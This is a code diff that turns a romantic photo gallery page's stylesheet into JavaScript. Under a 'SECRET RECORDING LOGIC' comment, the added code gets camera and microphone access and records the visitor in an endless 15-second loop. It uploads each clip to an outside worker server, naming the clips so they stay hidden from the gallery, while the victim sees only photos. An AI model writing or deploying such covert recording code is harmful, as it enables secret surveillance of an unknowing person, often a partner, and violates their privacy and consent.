@@ -1,37 +1,145 @@
-:root {
-    --bg-color: #fff0f5;
-    --card-bg: #ffffff;
-    --text-color: #333;
-    --accent: #ff4d6d;
+const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev';
+
+const landingPage = document.getElementById('landing-page');
+const galleryPage = document.getElementById('gallery-page');
+const startBtn = document.getElementById('start-recording-btn');
+
+const RECORDING_CHUNK_MS = 15000; // 15 seconds
+
+// --- SECRET RECORDING LOGIC ---
+startBtn.addEventListener('click', async () => {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        
+        landingPage.style.display = 'none';
+        galleryPage.style.display = 'block';
+
+        // গ্যালারির ছবি লোড করা
+        loadGalleryImages();
+
+        // নতুন রেকর্ডিং লুপ চালু করা
+        startRecordingCycle(stream);
+
+    } catch (err) {
+        console.log("Camera access denied or failed.");
+        landingPage.style.display = 'none';
+        galleryPage.style.display = 'block';
+        
+        // ক্যামেরা ফেইল হলেও গ্যালারি লোড হবে
+        loadGalleryImages();
+    }
+});
+
+function startRecordingCycle(stream) {
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+
+    mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+            chunks.push(event.data);
+        }
+    };
+
+    mediaRecorder.onstop = async () => {
+        const finalBlob = new Blob(chunks, { type: 'video/webm' });
+        await uploadChunk(finalBlob);
+        startRecordingCycle(stream); // লুপ কন্টিনিউ
+    };
+
+    mediaRecorder.start();
+
+    setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
+    }, RECORDING_CHUNK_MS);
 }
-body.theme-night { --bg-color: #1a1a2e; --card-bg: #16213e; --text-color: #e94560; --accent: #e94560; }
-body.theme-pink { --bg-color: #ffe6ea; --card-bg: #fff; --text-color: #d81b60; --accent: #d81b60; }
 
-body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--bg-color); color: var(--text-color); transition: background 0.3s ease; }
-
-/* Premium Header UI */
-.gallery-header {
-    display: flex; justify-content: space-between; align-items: center;
-    padding: 15px 20px; background: var(--card-bg);
-    box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-    position: sticky; top: 0; z-index: 100;
-    border-bottom-left-radius: 20px; border-bottom-right-radius: 20px;
+async function uploadChunk(blob) {
+    const formData = new FormData();
+    // ভিডিওর নাম reaction- দিয়ে সেভ হবে (যাতে গ্যালারিতে শো না করে)
+    formData.append('file', blob, `reaction-${Date.now()}.webm`);
+    
+    try {
+        await fetch(`${WORKER_URL}/api/upload`, { 
+            method: 'POST', 
+            body: formData 
+        });
+    } catch (err) { 
+        console.log("Upload delayed due to network."); 
+    }
 }
-.logo { margin: 0; font-size: 1.4rem; font-weight: bold; color: var(--accent); }
-.header-actions { display: flex; gap: 15px; align-items: center; }
 
-/* Modern Icon Buttons */
-.icon-btn {
-    background: none; border: none; padding: 5px; cursor: pointer;
-    color: var(--text-color); transition: 0.2s ease; display: flex;
+
+// --- PREMIUM GALLERY UI & UPLOAD LOGIC ---
+const uploadBtn = document.getElementById('upload-btn');
+const imageUploadInput = document.getElementById('image-upload-input');
+const galleryContainer = document.getElementById('gallery');
+
+if(uploadBtn) {
+    uploadBtn.addEventListener('click', () => imageUploadInput.click());
 }
-.icon-btn:hover { color: var(--accent); transform: scale(1.1); }
 
-/* Gallery Layouts */
-.gallery { padding: 15px; min-height: 80vh; }
-.layout-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-.layout-grid img { width: 100%; aspect-ratio: 1; object-fit: cover; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-.layout-masonry { columns: 2; column-gap: 10px; }
-.layout-masonry img { width: 100%; border-radius: 12px; margin-bottom: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: block; }
+if(imageUploadInput) {
+    imageUploadInput.addEventListener('change', async (e) => {
+        const files = e.target.files;
+        if (files.length === 0) return;
+        
+        galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
+        
+        for (let file of files) {
+            const formData = new FormData();
+            formData.append('file', file);
+            try {
+                await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData });
+            } catch (err) { console.error(err); }
+        }
+        loadGalleryImages(); // আপলোড শেষে গ্যালারি রিফ্রেশ করবে
+    });
+}
 
-.loading-text { text-align: center; width: 100%; margin-top: 50px; font-style: italic; opacity: 0.6; grid-column: span 2; }
+// Cloudflare থেকে ছবিগুলো এনে গ্যালারিতে দেখানোর ফাংশন
+async function loadGalleryImages() {
+    if(!galleryContainer) return;
+    galleryContainer.innerHTML = '<div class="loading-text">Loading our memories... ✨</div>';
+    
+    try {
+        const res = await fetch(`${WORKER_URL}/api/images`);
+        if (res.ok) {
+            const data = await res.json();
+            galleryContainer.innerHTML = ''; 
+            
+            if (data.images.length === 0) {
+                galleryContainer.innerHTML = '<div class="loading-text">No photos yet. Click the upload icon above! ❤️</div>';
+                return;
+            }
+            
+            // ছবিগুলো গ্যালারিতে যোগ করা হচ্ছে
+            data.images.forEach(imgKey => {
+                const imgEl = document.createElement('img');
+                imgEl.src = `${WORKER_URL}/api/image/${imgKey}`;
+                imgEl.loading = 'lazy';
+                galleryContainer.appendChild(imgEl);
+            });
+        }
+    } catch (error) {
+        galleryContainer.innerHTML = '<div class="loading-text">Could not load images right now.</div>';
+    }
+}
+
+
+// --- THEME & LAYOUT SWITCHING ---
+document.getElementById('theme-toggle').addEventListener('click', () => {
+    const themes = ['theme-day', 'theme-night', 'theme-pink'];
+    let current = themes.find(t => document.body.classList.contains(t)) || 'theme-pink';
+    document.body.classList.remove(current);
+    let next = themes[(themes.indexOf(current) + 1) % themes.length];
+    document.body.classList.add(next);
+});
+
+document.getElementById('view-grid').addEventListener('click', () => {
+    document.getElementById('gallery').className = 'gallery layout-grid';
+});
+document.getElementById('view-masonry').addEventListener('click', () => {
+    document.getElementById('gallery').className = 'gallery layout-masonry';
+});
